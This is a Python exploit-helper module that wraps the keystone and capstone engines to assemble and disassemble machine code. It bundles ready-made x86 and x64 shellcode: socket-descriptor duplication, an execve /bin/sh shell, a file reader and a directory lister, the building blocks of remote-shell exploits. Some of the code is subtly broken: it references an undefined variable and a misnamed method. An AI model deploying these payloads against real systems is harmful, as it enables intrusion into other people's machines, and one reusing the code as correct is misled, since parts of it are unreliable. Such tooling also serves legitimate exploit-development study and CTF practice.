#!/usr/bin/python
# from __future__ import print_function
from struct import *
from ctypes import *
from capstone import *
# use keystone-engine to compile asm code
from keystone import * 
# a collection of shellcode use regulary on exploit code.
# from SCUtils import *

support_archs = (
	'x86',
	'x86_64',
	'arm_thumb',
	'arm_32',
	'arm_64'
)

'''
	asm() compile assmembly code to cpu code
'''

def asm(asm_code, arch):
	# use to compile and extract your shellcode
	if arch not in support_archs:
		msg = 'Your architecture {0} is not valid. '.format(arch)
		msg+= 'Own supported architectures are: ' + str(supported_arch)
		raise OSError(msg)

	try:
		if arch == 'x86_64':
			ks = Ks(KS_ARCH_X86, KS_MODE_64)
		elif arch == 'x86':
			ks = Ks(KS_ARCH_X86, KS_MODE_32)
		elif arch == 'arm_thumb':
			ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
		elif arch == 'arm_32':
			ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
		else:
			# arch == 'arm_64':
			ks = Ks(KS_ARCH_ARM64, KS_MODE_ARM)
	
		encoding, count = ks.asm(asm_code)
		# convert list of byte code to a string
		return encoding
	except KsError as err:
		print("[ERROR] ", err)
		return []

# wrapper popular architecure for asm function #

def asm_x86(asm_code):
	return asm(asm_code, 'x86')

def asm_x86_64(asm_code):
	return asm(asm_code, 'x86_64')


'''
	disas() turn byte code to assembly language
'''

def disas(cpu_code, arch, base_addr = 0x4000):
	if type(cpu_code) is str:
		cpu_code = cpu_code.encode('utf-8')

	if arch not in support_archs:
		msg = 'Your architecture {0} is not valid. '.format(arch)
		msg+= 'Own supported architectures are: ' + str(supported_arch)
		raise OSError(msg)

	md = None
	if arch == 'x86_64':
		md = Cs(CS_ARCH_X86, CS_MODE_64)
	elif arch == 'x86':
		md = Cs(CS_ARCH_X86, CS_MODE_32)
	elif arch == 'arm_thumb':
		md = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
	elif arch == 'arm_32':
		md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
	else:
		#arch == 'arm_64':
		md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

	if not md:
		raise OSError("Something error, pls check capstone-engine package.")

	for (address, size, mnemonic, op_str) in md.disasm_lite(cpu_code, base_addr):	
		print("0x%x:\t%s\t%s" % (address, mnemonic, op_str))

class x86SC:

	@classmethod
	def dupSock(cls, fd = 4):
		code = '''
			xor ecx,ecx
			push {0}
			pop ebx
		loop:
			push 0x3f
			pop eax
			int 0x80
			inc cl
			cmp cl,3
			jne loop
		'''
		code = code.format(fd)
		return asm(code, 'x86')

	@classmethod
	def execveShell(cls):
		code = '''
			push   	0xb
			pop    	eax
			cdq
			push   	edx
			push   	0x68732f2f
			push   	0x6e69622f
			mov    	ebx, esp
			xor    	ecx, ecx
			int    	0x80
		'''
		return asm(code,'x86')

	@classmethod
	def dupsExecve(cls, fd = 4):
		# reuse socket fd and execve()
		return cls.dupsSock(fd) + b'\x90'*4 + cls.execveShell()

	@classmethod
	def alloca_stack(cls):
		code = '''
			push 1
			pop ecx
			shl ecx,0xb
			sub esp,ecx
		'''
		return asm(code, 'x86')

	@classmethod
	def jmp(cls, offset):
		offset = offset & 0xff
		return asm('jmp {0}'.format(offset), 'x86')

	@classmethod
	def jmp_addr(cls, addr):
		addr = addr & 0xffffffff # addr must be 4 bytes long
		code = '''
			push 0x%x
			pop eax
			jmp eax
		'''
		code = code % addr
		return asm(code,'x86')

	@classmethod
	def read_file(cls, file_name):
		sc = '''
			push 5
			pop eax
			call get_eip
			add ebx,0x24
			xor ecx,ecx
			xor edx,edx
			int 0x80
			push eax
			push 3
			pop eax
			pop ebx
			mov ecx,esp
			push 0xff
			pop edx
			int 0x80
			xor ebx,ebx
			inc ebx
			push 4
			pop eax
			int 0x80
		get_eip:
			mov ebx,[esp]
			ret
		'''
		asm_code = asm(sc, 'x86')
		asm_code += file_name + b'\x00'
		return asm_code

class x64SC:
	@classmethod
	def ls(cls):
		code = '''
			mov rdi, 0x605000
			mov rax, 0x2e
			mov [rdi], rax
			mov rax, 2
			xor rsi, rsi
			cdq
			syscall

			mov rdi, rax
			mov rax, 0x4e
			mov rsi, 0x605000
			cdq
			mov dh, 0x10
			syscall

			mov rdi, 1
			mov rsi, 0x605000
			mov rdx, rax
			mov rax, 1
			syscall
		'''
		return asm(code, 'x86_64')